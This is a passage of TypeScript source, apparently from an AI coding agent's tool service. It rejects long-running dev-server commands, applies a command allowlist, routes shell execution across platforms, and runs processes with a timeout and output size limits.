      // `vite build`, and NOT `ls path/to/vite` (which begins with `ls`).
      /^(?:\.?\/[^\s]*\/)?(?:npx\s+)?vite(?:\s+(?!build\b)|$)/i,
      /^(?:npx\s+)?next\s+(?:dev|start)\b/i,
      /^(?:npx\s+)?nodemon\b/i,
      /^(?:npx\s+)?tsx\s+watch\b/i,
      /^(?:npx\s+)?nuxt\s+(?:dev|preview)\b/i,
      // `node_modules/.bin/vite ...` as the literal command.
      /^node_modules\/\.bin\/(?:vite|next|nodemon|nuxt)(?:\s|$)/i,
    ];
    const offendingStage = stages.find(stage => devServerStagePatterns.some(re => re.test(stage)));
    if (offendingStage) {
      throw new Error(
        `Command rejected: '${offendingStage.substring(0, 60)}' looks like a long-running dev server, which will hang the tool loop. Use the 'ide_run_in_sandbox' tool (WebContainer) to start dev servers, or ask the user to click the Run button in the coding panel.`
      );
    }

    if (!allowArbitraryShell) {
      this.assertCommandAllowed(command);
    }

    // Windows shell routing: prefer git-bash if present (agent writes POSIX
    // shell — `&` backgrounds, `$!`, `sleep`, `|| echo`, `/dev/null`, etc.
    // — none of which cmd.exe handles correctly). Fall back to cmd /c with
    // a narrow POSIX→cmd translation when git-bash isn't installed.
    // A real shell is needed for pipelines, redirects (even glued ones like
    // `a>b`), globs and expansions. Otherwise spawn directly with the
    // lexer's argv so quoted arguments (`grep "foo bar" f`) arrive intact.
    let lexed: ReturnType<typeof lexShellCommand> | null = null;
    try {
      lexed = lexShellCommand(command, 'posix');
    } catch {
      lexed = null; // only reachable with SOLVENT_ALLOW_SHELL=true; let the shell parse it
    }
    const useShell = !lexed || lexed.needsShell || lexed.stages.length !== 1 || hasShellMetacharacters(command);
    let executable: string;
    let args: string[];
    let overridePath: string | null = null;
    if (process.platform === 'win32') {
      if (WIN_BASH_PATH) {
        // Spawn git-bash by absolute path. Keep the cwd Windows-style —
        // CreateProcess requires it, and git-bash handles Windows paths
        // (and POSIX ones) natively once it's running.
        executable = WIN_BASH_PATH;
        args = ['-c', command.trim()];
        // Prepend git-bash's bin to PATH so shimmed binaries (npm, node,
        // etc. that live in Git's msys layout) resolve inside the shell.
        overridePath = path.dirname(WIN_BASH_PATH) + path.delimiter + (process.env.PATH ?? '');
      } else {
        executable = 'cmd';
        args = ['/c', translatePosixShellismsForWindows(command.trim())];
      }
    } else if (useShell) {
      executable = '/bin/sh';
      args = ['-c', command.trim()];
    } else {
      const parts = lexed!.stages[0]!.words.map(w => w.text);
      const first = parts[0];
      if (!first) return Promise.reject(new Error('Empty command'));
      executable = first;
      args = parts.slice(1);
    }

    return new Promise((resolve, reject) => {
      const spawnEnv: NodeJS.ProcessEnv = {
        ...process.env as NodeJS.ProcessEnv,
        NO_COLOR: '1',
      };
      if (overridePath) spawnEnv.PATH = overridePath;
      const proc = spawn(executable, args, {
        cwd: getEffectiveProjectRoot(),
        env: spawnEnv,
        shell: false,
        stdio: ['pipe', 'pipe', 'pipe']
      });

      if (!proc.stdout || !proc.stderr) {
        return reject(new Error('Failed to open stdio streams'));
      }

      const child = {
        stdout: proc.stdout,
        stderr: proc.stderr,
        on: proc.on.bind(proc)
      };

      let stdout = '';
      let stderr = '';
      let stdoutTruncated = false;
      let stderrTruncated = false;
      let timedOut = false;

      // Kill any command that runs longer than 3 minutes — protects against
      // unexpected long-runners that slipped past the dev-server pattern check.
      const TIMEOUT_MS = 180_000;
      const timer = setTimeout(() => {
        timedOut = true;
        proc.kill();
      }, TIMEOUT_MS);

      // Cap accumulated output — a verbose command (npm install, git log -p)
      // can otherwise grow these strings unboundedly until the 3-minute
      // timeout fires, putting memory pressure on the whole backend process.
      const MAX_OUTPUT_BYTES = 512 * 1024; // 512KB per stream

      child.stdout.on('data', (data: Buffer) => {
        if (stdout.length < MAX_OUTPUT_BYTES) {
          stdout += data.toString();
        } else if (!stdoutTruncated) {
          stdout += '\n... (stdout truncated at 512KB)';
          stdoutTruncated = true;
        }
      });

      child.stderr.on('data', (data: Buffer) => {
        if (stderr.length < MAX_OUTPUT_BYTES) {
          stderr += data.toString();
        } else if (!stderrTruncated) {
          stderr += '\n... (stderr truncated at 512KB)';
          stderrTruncated = true;
        }
      });

      child.on('error', (err: Error) => {
        clearTimeout(timer);
        reject(new Error(`Command execution failed: ${err.message}`));
      });

      child.on('close', (code: number | null) => {
        clearTimeout(timer);
        if (timedOut) {
          reject(new Error(`Command timed out after ${TIMEOUT_MS / 1000}s and was killed. Partial stdout:\n${stdout.slice(-500)}`));
        } else if (code === 0) {
          resolve({ stdout, stderr });
        } else {
          reject(new Error(`Command exited with code ${code}\n${stderr}`));
        }
      });
    });
  }
}

export const toolService = new ToolService();
